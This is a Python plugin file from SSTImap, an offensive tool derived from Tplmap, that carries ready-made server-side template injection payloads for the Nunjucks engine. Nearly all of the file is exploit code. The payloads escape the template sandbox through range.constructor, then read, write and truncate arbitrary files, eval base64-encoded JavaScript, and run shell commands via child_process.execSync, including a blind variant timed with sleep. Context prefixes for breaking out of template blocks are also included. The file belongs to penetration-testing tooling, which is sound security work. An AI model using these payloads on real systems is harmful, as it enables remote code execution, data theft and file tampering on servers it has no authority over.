from plugins.languages import javascript
from utils import rand


class Nunjucks(javascript.Javascript):
    priority = 5
    plugin_info = {
        "Description": """Nunjucks template engine""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Jeremy Bae @opt9 https://github.com/opt9",  # Contributions to the Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "Engine": [
            "Homepage: https://mozilla.github.io/nunjucks/",
            "Github: https://github.com/mozilla/nunjucks",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                'test_render': f'{{{{({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|dump}}}}',
                'test_render_expected': f'{rand.randints[1]*rand.randints[2]}'
            },
            'write': {
                'call': 'inject',
                'write': """{{{{range.constructor("global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')")()}}}}""",
                'truncate': """{{{{range.constructor("global.process.mainModule.require('fs').writeFileSync('{path}', '')")()}}}}"""
            },
            'read': {
                'call': 'evaluate',
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'call': 'evaluate',
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """{{{{range.constructor("return eval(Buffer('{code_b64p}','base64').toString())")()}}}}""",
                'test_os': """global.process.mainModule.require('os').platform()""",
                'test_os_expected': r'^[\w-]+$',
            },
            'execute': {
                'call': 'evaluate',
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{{{range.constructor("global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')")()}}}}"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '{{1', 'closures': javascript.ctx_closures},
            {'level': 1, 'prefix': '{closure} %}}', 'suffix': '', 'closures': javascript.ctx_closures},
            {'level': 5, 'prefix': '{closure} %}}{{% endfor %}}{{% for a in [1] %}}', 'suffix': '', 'closures': javascript.ctx_closures},
            # This escapes string {% set %s = 1 %}
            {'level': 5, 'prefix': '{closure} = 1 %}}', 'suffix': '', 'closures': javascript.ctx_closures},
            # Comment blocks
            {'level': 5, 'prefix': '#}}', 'suffix': '{#'},
        ])
